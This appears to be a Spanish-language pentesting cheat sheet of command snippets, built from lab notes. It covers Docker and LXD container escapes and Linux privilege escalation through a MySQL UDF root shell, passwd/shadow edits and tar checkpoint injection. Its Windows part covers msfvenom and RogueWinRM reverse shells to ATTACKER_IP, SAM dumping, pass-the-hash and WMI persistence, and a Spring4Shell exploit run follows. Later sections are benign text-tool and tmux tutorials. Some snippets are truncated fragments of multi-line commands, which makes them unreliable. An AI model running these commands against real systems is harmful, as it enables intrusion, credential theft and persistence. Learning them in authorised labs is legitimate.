#### 🐳 Docker Engine – TCP Socket Exploitation & Namespace Escape
```bash
thm-docker-host
```

#### Grupos del sistema. Buscar docker, lxd, disk, adm, sudo, wheel
```bash
cat /etc/group | grep -v '^#'
```

#### Comprobar si el usuario está en el grupo docker. Docker group = root efectivo
```bash
id | grep docker
```

#### Monta el filesystem del host en /mnt dentro del contenedor y hace chroot — shell root en el host
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

#### Igual con imagen Ubuntu si Alpine no está disponible
```bash
docker run -v /:/mnt --rm -it ubuntu:latest chroot /mnt bash
```

#### Listar imágenes disponibles localmente. Usar cualquiera que exista
```bash
docker images
```

#### Comprobar si el usuario está en el grupo lxd. LXD group = root efectivo igual que docker
```bash
id | grep lxd
```

#### Construir imagen Alpine minimal en el atacante y servirla por HTTP
```bash
# En el atacante: construir imagen Alpine mínima
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo ./build-alpine
python3 -m http.server 8080
```

#### En el target: importar imagen Alpine al LXD local
```bash
wget http://ATTACKER_IP:8080/alpine-v3.x-x86_64.tar.gz -O /tmp/alpine.tar.gz
lxc image import /tmp/alpine.tar.gz --alias pwn
```

#### Crear contenedor privilegiado (security.privileged=true = sin restricciones de namespace)
```bash
lxc init pwn ignite -c security.privileged=true
```

#### Iniciar contenedor y obtener shell dentro
```bash
lxc start ignite && lxc exec ignite /bin/sh
```

#### Desde dentro del contenedor: chroot al filesystem del host = shell root real
```bash
chroot /mnt/root /bin/bash
```

---

## 11 — Core System Commands & Linux Post-Exploitation

#### ️ INFORMACIÓN DEL SISTEMA: Muestra el nombre del host actual.
```bash
hostname
```

#### ️ INFORMACIÓN DEL SISTEMA: Muestra el usuario o contexto actual.
```bash
whoami
```

#### ️ INFORMACIÓN DEL SISTEMA: Muestra UID, GID y grupos efectivos del usuario.
```bash
id
```

#### ️ INFORMACIÓN DEL SISTEMA: Muestra el uso de discos y sistemas de archivos.
```bash
df -h
```

#### ️ INFORMACIÓN DEL SISTEMA: Muestra memoria RAM y swap disponibles.
```bash
free -h
```

#### COMANDOS DE RED: Muestra la configuración de interfaces de red.
```bash
ifconfig -a
```

#### COMANDOS DE RED: Muestra vecinos y resoluciones ARP conocidas.
```bash
arp -a
```

#### COMANDOS DE RED
```bash
sudo lsof -i
```

#### COMANDOS DE RED
```bash
sudo lsof -i :25
```

#### COMANDOS DE RED: Muestra el contenido del archivo indicado.
```bash
cat /etc/resolv.conf
```

#### LISTADO DE DIRECTORIOS Y PAQUETES: Lista el contenido de la ruta indicada.
```bash
ls -lh /var/mail/
```

#### LISTADO DE DIRECTORIOS Y PAQUETES: Lista el contenido de la ruta indicada.
```bash
ls -lh /usr/bin/
```

#### LISTADO DE DIRECTORIOS Y PAQUETES: Lista el contenido de la ruta indicada.
```bash
ls -lh /sbin/
```

#### LISTADO DE DIRECTORIOS Y PAQUETES: Enumera paquetes instalados en sistemas RPM.
```bash
rpm -qa
```

#### LISTADO DE DIRECTORIOS Y PAQUETES: Enumera paquetes instalados en sistemas Debian/Ubuntu.
```bash
dpkg -l
```

#### ⚙️ PS OPCIONES IMPORTANTES: Lista procesos en ejecución.
```bash
ps -ef | grep user
```

#### ⚙️ PS OPCIONES IMPORTANTES: Lista procesos en ejecución.
```bash
ps -aux | grep user
```

#### Información de usuarios y grupos: Muestra cuentas locales y shells del sistema.
```bash
cat /etc/passwd
```

#### Información de usuarios y grupos: Muestra el contenido del archivo indicado.
```bash
cat /etc/group
```

#### Información de usuarios y grupos
```bash
sudo cat /etc/shadow
```

#### Procesos: Lista procesos en ejecución.
```bash
ps -e
```

#### Procesos: Lista procesos en ejecución.
```bash
ps -f
```

#### Procesamiento de texto
```bash
sed 's/old/new/g' file.txt
```

#### Procesamiento de texto
```bash
awk '{print $1}' file.txt
```

#### Procesamiento de texto: Busca coincidencias en archivos o en la salida del comando.
```bash
grep 'pattern' file.txt
```

#### Procesamiento de texto
```bash
cut -d':' -f1 /etc/passwd
```

#### Procesamiento de texto
```bash
sort file.txt
```

#### Procesamiento de texto
```bash
uniq file.txt
```

#### NOTAS IMPORTANTES PARA PENTESTERS
```bash
groups
```

#### NOTAS IMPORTANTES PARA PENTESTERS
```bash
history
```

#### USUARIOS Y GRUPOS / Información de usuarios: Muestra cuentas locales y shells del sistema.
```bash
cat /etc/passwd | cut -d ":" -f 1
```

#### USUARIOS Y GRUPOS / Información de usuarios: Encadena comandos o filtra resultados para obtener información más útil.
```bash
grep -vE "nologin|false" /etc/passwd
```

#### PROCESOS Y SERVICIOS / Procesos en ejecución: Lista procesos en ejecución.
```bash
ps -A
```

#### PROCESOS Y SERVICIOS / Servicios y daemons: Gestiona o activa servicios de systemd.
```bash
systemctl list-units --type=service
```

#### PROCESOS Y SERVICIOS / Servicios y daemons
```bash
service --status-all
```

#### PROCESOS Y SERVICIOS / Servicios y daemons
```bash
chkconfig --list
```

#### RED Y CONEXIONES / Interfaces y routing
```bash
route -n
```

#### RED Y CONEXIONES / Conexiones de red
```bash
lsof -i
```

#### SISTEMA DE ARCHIVOS / Búsqueda de archivos: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find / -name flag.txt 2>/dev/null
```

#### SISTEMA DE ARCHIVOS / Búsqueda de archivos: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find / -type f -perm 0777 2>/dev/null
```

#### SISTEMA DE ARCHIVOS / Búsqueda de archivos: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find / -writable -type d 2>/dev/null
```

#### SISTEMA DE ARCHIVOS / Búsqueda de archivos: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find / -user root -perm /4000 2>&1 | grep -v "Permission denied"
```

#### SISTEMA DE ARCHIVOS / Archivos importantes: Lista el contenido de la ruta indicada.
```bash
ls -la /home/*
```

#### SISTEMA DE ARCHIVOS / Archivos importantes: Lista el contenido de la ruta indicada.
```bash
ls -la /root/
```

#### SISTEMA DE ARCHIVOS / Archivos importantes: Muestra hashes de contraseñas si el archivo es legible.
```bash
cat /etc/shadow
```

#### SISTEMA DE ARCHIVOS / Archivos importantes: Muestra el contenido del archivo indicado.
```bash
cat /etc/hosts
```

#### ⚡ VARIABLES Y ENTORNO / Configuraciones: Muestra el contenido del archivo indicado.
```bash
cat ~/.bash_history
```

#### ⚡ VARIABLES Y ENTORNO / Configuraciones: Muestra el contenido del archivo indicado.
```bash
cat ~/.ssh/*
```

#### ⚡ VARIABLES Y ENTORNO / Configuraciones: Muestra el contenido del archivo indicado.
```bash
cat /etc/profile
```

#### HERRAMIENTAS AUTOMATIZADAS / Otras herramientas: Descarga contenido o ficheros desde una URL.
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```

#### HERRAMIENTAS AUTOMATIZADAS / Otras herramientas: Descarga contenido o ficheros desde una URL.
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
```

#### HERRAMIENTAS AUTOMATIZADAS / Otras herramientas: Descarga contenido o ficheros desde una URL.
```bash
wget https://raw.githubusercontent.com/linted/linuxprivchecker/master/linuxprivchecker.py
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Cuando MySQL corre como root sin password
```bash
cd /home/user/tools/mysql-udf
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Cuando MySQL corre como root sin password
```bash
gcc -g -c raptor_udf2.c -fPIC
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Cuando MySQL corre como root sin password
```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Cuando MySQL corre como root sin password
```bash
mysql -u root
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Comandos MySQL para crear función UDF: Cambia el contexto de la base de datos actual.
```bash
use mysql;
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Comandos MySQL para crear función UDF: Encadena comandos o filtra resultados para obtener información más útil.
```bash
create table foo(line blob);
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Comandos MySQL para crear función UDF: Encadena comandos o filtra resultados para obtener información más útil.
```bash
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Comandos MySQL para crear función UDF: Encadena comandos o filtra resultados para obtener información más útil.
```bash
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Comandos MySQL para crear función UDF: Encadena comandos o filtra resultados para obtener información más útil.
```bash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Ejecutar shell root
```bash
/tmp/rootbash -p
```

#### EXPLOTACIÓN MYSQL COMO ROOT / Ejecutar shell root
```bash
rm /tmp/rootbash
```

#### MANIPULACIÓN /etc/shadow / Cuando /etc/shadow es legible: Lista el contenido de la ruta indicada.
```bash
ls -l /etc/shadow
```

#### MANIPULACIÓN /etc/shadow / Cuando /etc/shadow es legible
```bash
echo 'root:$6$T1...' > hash.txt
```

#### MANIPULACIÓN /etc/shadow / Cuando /etc/shadow es legible: Crackea hashes con John the Ripper.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

#### MANIPULACIÓN /etc/shadow / Cuando /etc/shadow es escribible: Genera un hash de contraseña para reutilizarlo en credenciales locales.
```bash
mkpasswd -m sha-512 newpassword
```

#### MANIPULACIÓN /etc/passwd / Cuando /etc/passwd es escribible
```bash
echo "newroot:generatedhash:0:0:root:/root:/bin/bash" >> /etc/passwd
```

#### VARIABLES DE ENTORNO SUDO / LD PRELOAD Exploit
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

#### ARCHIVOS DE INICIO SHELL / Abusar de .bashrc: Muestra el contenido del archivo indicado.
```bash
cat ~/.bashrc
```

#### ARCHIVOS DE INICIO SHELL / Abusar de .bashrc
```bash
mkdir -p /home/user/scripts
```

#### ARCHIVOS DE INICIO SHELL / Abusar de .bashrc
```bash
chmod +xs /tmp/rootbash' > /home/user/scripts/clear.sh
```

#### ARCHIVOS DE INICIO SHELL / Abusar de .bashrc
```bash
chmod +x /home/user/scripts/clear.sh
```

#### TÉCNICAS AVANZADAS / Capabilities: Encadena comandos o filtra resultados para obtener información más útil.
```bash
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'
```

#### TÉCNICAS AVANZADAS / Services Writable: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find /etc/systemd/system -writable 2>/dev/null
```

#### TÉCNICAS AVANZADAS / Services Writable
```bash
WantedBy=multi-user.target' > /tmp/root.service
```

#### TÉCNICAS AVANZADAS / Services Writable: Gestiona o activa servicios de systemd.
```bash
systemctl link /tmp/root.service
```

#### TÉCNICAS AVANZADAS / Services Writable: Gestiona o activa servicios de systemd.
```bash
systemctl enable --now /tmp/root.service
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
xfreerdp /u:admin /v:192.168.1.100 /f /cert:ignore /dynamic-resolution
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
xfreerdp /u:admin /p:password123 /v:192.168.1.100 /w:1280 /h:720 /cert:ignore /dynamic-resolution
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
xfreerdp /u:user /pth:HASH /v:TARGET_IP
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
nc -lvp 4444
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc qc apphostsvc
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc qc WindowsScheduler
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc stop windowsscheduler
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc start windowsscheduler
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc qc "disk sorter enterprise"
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc stop "disk sorter enterprise"
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc start "disk sorter enterprise"
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
accesschk64.exe -qlc thmservice
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc stop THMService
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc start THMService
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
reg save hklm\system C:\temp\system.hive
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
reg save hklm\sam C:\temp\sam.hive
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
PrintSpoofer.exe -i -c "cmd.exe"
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
wmic product get name,version,vendor
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
powershell "Get-WmiObject -Class Win32_Product | Select-Object Name,Version,Vendor"
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
.\Druva_inSync_exploit.ps1
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
Set-ExecutionPolicy Bypass -Scope process -Force
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
Invoke-PrivescCheck
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
Invoke-AllChecks
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
wes.py systeminfo.txt
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
use multi/recon/local_exploit_suggester
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
set session 1
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
exploit
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc qc service_name
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
procmon.exe # Para identificar DLLs cargadas
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
use incognito
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH -x whoami
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
impacket-psexec -hashes :NTLM_HASH administrator@TARGET_IP
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
$FilterArgs = @{name='WindowsUpdate';
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
EventNameSpace='root\CimV2';
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
QueryLanguage="WQL";
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
$ConsumerArgs = @{name='WindowsUpdate';
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
$FilterToConsumerArgs = @{Filter = [Ref] $Filter;
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

#### 🔵 Auditoría de SSH (ssh-audit)
```bash
git clone https://github.com/jtesta/ssh-audit.git
```

#### 🔵 Auditoría de SSH (ssh-audit)
```bash
cd ssh-audit
```

#### 🔵 Auditoría de SSH (ssh-audit)
```bash
./ssh-audit.py 10.129.14.132
```

#### 🔵 Auditoría de SSH (ssh-audit)
```bash
ssh -v usuario@IP -o PreferredAuthentications=password
```

#### 🔵 Servicios R — rsh, rlogin, rexec
```bash
nmap -sV -p 512,513,514 10.0.17.2
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk [flags] 'PATTERN {acción}' archivo.txt
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
cat archivo.txt | awk '{print $1}'
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk -f script.awk archivo.txt
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk '/ctf/' archivo.txt
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk '{print $1","$3}' archivo.txt
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk '{print NR, $0}' archivo.txt
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk 'BEGIN{FS=":"; OFS="-"} {print $1, $3}' archivo.txt
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk "BEGIN{FS=\"o\"} {print $1,$3} END{print \"Total líneas:\", NR}" archivo.txt
```

#### 📊 `awk` – Manipulación avanzada de texto
```bash
awk 'BEGIN{OFS=":"} {print $1,$2}' archivo.txt
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl [opciones] https://ejemplo.com
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl https://google.com
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -O https://example.com/archivo.txt
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -C - -O https://example.com/video.mp4
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -o pagina.html https://example.com
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -X POST -d "username=admin&password=123" https://example.com/login
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -b "PHPSESSID=abcd1234;" https://example.com/panel
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -I https://example.com
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -A "Mozilla/5.0 (Windows NT 10.0)" https://example.com
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -u admin:admin123 https://example.com/privado
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep "PATTERN" archivo.txt
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep -E "^s.*n$" archivo.txt # Coincide con líneas que empiezan con 's' y terminan con 'n'
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep -e "sol" -e "luna" archivo.txt # Coincide con "sol" o "luna"
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep -i "admin" archivo.txt
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep -c "error" archivo.log
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep -e "root" -e "user" archivo.txt
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep -E "admin|user|root" archivo.txt
```

#### 📘 Grep, Egrep, Fgrep – Filtrado de texto con expresiones regulares
```bash
grep -v "access" archivo.txt
```

#### sort
```bash
awk '{print $2}'
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed [flags] 'rango comando/patrón/reemplazo/args' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed -e '1,3 s/john/JOHN/g' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed 's/test/TEST/g' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed '/^$/d' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed -n '5,10p' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed '3,6d' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed 's/apple/APPLE/1' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed 's#/home/user#/mnt/data#g' archivo.txt
```

#### 🧪 `sed` – Stream Editor (FIND, REPLACE, DELETE)
```bash
sed 's/\(^[[:alpha:] ]*\)\([[:digit:]]*\)/• \1[\2]/g' archivo.txt
```

#### 📄 `sort` y `uniq` – Ordenar y Filtrar líneas duplicadas
```bash
uniq nombres.txt
```

#### 📄 `sort` y `uniq` – Ordenar y Filtrar líneas duplicadas
```bash
sort archivo.txt | uniq
```

#### 📄 `sort` y `uniq` – Ordenar y Filtrar líneas duplicadas
```bash
sort archivo.txt | uniq -c
```

#### 📄 `sort` y `uniq` – Ordenar y Filtrar líneas duplicadas
```bash
sort archivo.txt
```

#### 📄 `sort` y `uniq` – Ordenar y Filtrar líneas duplicadas
```bash
sort -u archivo.txt -o limpio.txt
```

#### 📄 `sort` y `uniq` – Ordenar y Filtrar líneas duplicadas
```bash
sort archivo.txt | uniq -c | sort -nr
```

#### 🔁 Tmux anidado (nested)
```bash
ssh user@otro-host
```

#### 🔗 Fusionar ventanas/panes en una sola
```bash
join-pane -s <nombre-ventana-origen>
```

#### 🔗 Fusionar ventanas/panes en una sola
```bash
join-pane -t <nombre-ventana-destino>
```

#### 🔗 Fusionar ventanas/panes en una sola
```bash
join-pane -h -s <origen> -t <destino>
```

#### 🔗 Fusionar ventanas/panes en una sola
```bash
join-pane -v -s <origen> -t <destino>
```

#### 🛠️ Crear archivo de configuración
```bash
set -g status-style bg='#44475a',fg='#8be9fd'
```

#### 🛠️ Crear archivo de configuración
```bash
set -g prefix C-a
```

#### 📜 Aumentar historial para copiar más texto
```bash
set -g history-limit 10000
```

#### 🧾 Personalizar barra de estado izquierda
```bash
set -g status-left-length 15
```

#### 🧾 Personalizar barra de estado izquierda
```bash
set -g status-left '#(echo Try Harderer)'
```

#### 🔄 Recargar archivo .tmux.conf
```bash
source-file ~/.tmux.conf
```

#### 📜 Mostrar output de script en barra de estado
```bash
chmod +x script.sh
```

#### 📜 Mostrar output de script en barra de estado
```bash
set -g status-right '#(~/script.sh)'
```

#### 🔌 Plugins útiles desde GitHub
```bash
run-shell ~/.tmux/plugins/tmux-logging/logging.tmux
```

#### ⚠️ Evitar duplicación en status-right
```bash
set -ga status-right '#(~/script.sh)'
```

#### ⚠️ Evitar duplicación en status-right
```bash
set -g status-right '#H | %H:%M | %d-%b-%y'
```

#### 🖱️ Activar modo vi + ratón
```bash
set -g mode-keys vi
```

#### 🖱️ Activar modo vi + ratón
```bash
set -g mouse on
```

#### 🖱️ Activar modo vi + ratón
```bash
bind-key -T copy-mode-vi y send-keys -X copy-pipe-and-cancel "xclip -in -selection clipboard"
```

#### 📦 Usar configuraciones externas (Oh My Tmux)
```bash
mv ~/.tmux.conf ~/custom-tmux.bak
```

#### 📦 Usar configuraciones externas (Oh My Tmux)
```bash
git clone https://github.com/chaosma/tmuxconfig.git
```

#### 📦 Usar configuraciones externas (Oh My Tmux)
```bash
cp tmuxconfig/.tmux.conf ~/
```

#### 🧯 Restaurar configuración anterior
```bash
mv ~/custom-tmux.bak ~/.tmux.conf
```

#### 🔰 Script de instalación básica (.tmux.conf de OreoByte)
```bash
cd ~/
```

#### 🔰 Script de instalación básica (.tmux.conf de OreoByte)
```bash
git clone https://github.com/OreoByte/another_omt.git
```

#### 🔰 Script de instalación básica (.tmux.conf de OreoByte)
```bash
chmod +x ~/another_omt/thm_vpn
```

#### 🔰 Script de instalación básica (.tmux.conf de OreoByte)
```bash
chmod +x ~/another_omt/curl_thm_vpn
```

#### 🔰 Script de instalación básica (.tmux.conf de OreoByte)
```bash
cp ~/another_omt/simple_tmux.conf ~/.tmux.conf
```

#### 🧰 Instalación de TPM (Tmux Plugin Manager)
```bash
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
```

#### ⚙️ Agrega TPM y plugins a tu `.tmux.conf
```bash
run '~/.tmux/plugins/tpm/tpm'
```

#### ⚙️ Agrega TPM y plugins a tu `.tmux.conf
```bash
set -g @plugin 'tmux-plugins/tmux-resurrect'
```

#### ⚙️ Agrega TPM y plugins a tu `.tmux.conf
```bash
set -g @plugin 'tmux-plugins/tmux-logging'
```

#### ⚙️ Agrega TPM y plugins a tu `.tmux.conf
```bash
set -g @plugin 'tmux-plugins/tmux-yank'
```

#### ⚙️ Agrega TPM y plugins a tu `.tmux.conf
```bash
set -g @plugin 'jimeh/tmux-themepack'
```

#### ⚙️ Agrega TPM y plugins a tu `.tmux.conf
```bash
set -g @plugin 'tmux-plugins/tmux-battery'
```

#### ⚙️ Agrega TPM y plugins a tu `.tmux.conf
```bash
set -g @plugin 'tmux-plugins/tmux-open'
```

#### 🎨 Activar un tema visual chulo (opcional)
```bash
set -g @themepack 'powerline/default/green'
```

#### 🧼 Desinstalar todo (rollback)
```bash
rm -rf ~/.tmux ~/.tmux.conf ~/.tmux/plugins
```

#### 🔠 `tr` – Translate Command (Manipulación de cadenas)
```bash
cat archivo.txt | tr 'a-z' 'A-Z'
```

#### 🔠 `tr` – Translate Command (Manipulación de cadenas)
```bash
cat file.txt | tr '[:lower:]' '[:upper:]'
```

#### 🔠 `tr` – Translate Command (Manipulación de cadenas)
```bash
cat file.txt | tr -d '[:digit:]'
```

#### 🔠 `tr` – Translate Command (Manipulación de cadenas)
```bash
cat file.txt | tr -cd '[:alnum:]'
```

#### 🔠 `tr` – Translate Command (Manipulación de cadenas)
```bash
cat user.txt | tr -d '[:alpha:]: '
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget [opciones] protocolo://url
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget https://example.com/archivo.zip
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget -c https://example.com/video.mp4
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget -O shell.php https://example.com/uploads/exploit.php
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget -i urls.txt
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget --ask-password --user=admin https://example.com/secure/file.txt
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget --limit-rate=200k https://example.com/bigfile.iso
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget -w=3 -T=10 https://example.com
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget -O backup.zip -o logs.txt https://example.com/file.zip
```

#### 💾 `wget` – El clásico descargador por consola
```bash
wget -U "Mozilla/5.0 (Windows NT 10.0; Win64)" https://example.com
```

#### 🚀 `xargs` – Convertir entrada estándar en argumentos de comando
```bash
find . -name "*.log" | xargs rm
```

#### 🚀 `xargs` – Convertir entrada estándar en argumentos de comando
```bash
find /etc -name "*.conf" | xargs grep "Listen"
```

#### 🚀 `xargs` – Convertir entrada estándar en argumentos de comando
```bash
rm -- --checkpoint=1
```

#### 🚀 `xargs` – Convertir entrada estándar en argumentos de comando
```bash
rm -- --checkpoint-action=exec=sh
```

#### 🚀 `xargs` – Convertir entrada estándar en argumentos de comando
```bash
find . -type f -name "*.jpg" -print0 | xargs -0 rm
```

#### 🚀 `xargs` – Convertir entrada estándar en argumentos de comando
```bash
tar -cf archive.tar testfile --checkpoint=1 --checkpoint-action=exec=sh
```

#### 💥 Spring4Shell – Exploit Walkthrough
```bash
./exploit.py --help
```

#### 💥 Spring4Shell – Exploit Walkthrough
```bash
./exploit.py http://10.10.37.11/
```

#### 💥 Spring4Shell – Exploit Walkthrough
```bash
Your shell can be found at: http://10.10.37.11/tomcatwar.jsp?pwd=thm&cmd=whoami
```

#### 🧠 Desplegable
```bash
ls
```

#### 🧠 Desplegable
```bash
ls - list directory contents
```

#### 🧠 Desplegable
```bash
ls [OPTION]... [FILE]...
```

#### 🧠 Desplegable
```bash
ls --help
```

#### 🧠 Desplegable
```bash
curl -h
```

#### 🧠 Desplegable
```bash
sudo (8) - execute a command as another user
```

